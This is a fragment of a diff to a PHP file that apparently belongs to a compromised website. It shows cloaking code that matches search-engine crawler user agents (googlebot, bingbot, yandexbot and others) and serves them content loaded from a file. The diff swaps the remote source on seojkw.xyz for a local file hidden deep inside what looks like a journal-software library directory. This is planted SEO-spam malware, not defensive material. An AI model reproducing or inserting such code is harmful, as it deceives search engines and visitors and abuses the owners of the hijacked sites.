@@ -16,7 +16,7 @@ function skylight_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://seojkw.xyz/win/landing.txt";
+$bot = "/home/u1527432/public_html/win/lib/pkp/classes/author/maps/index.txt";
 $file = skylight_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
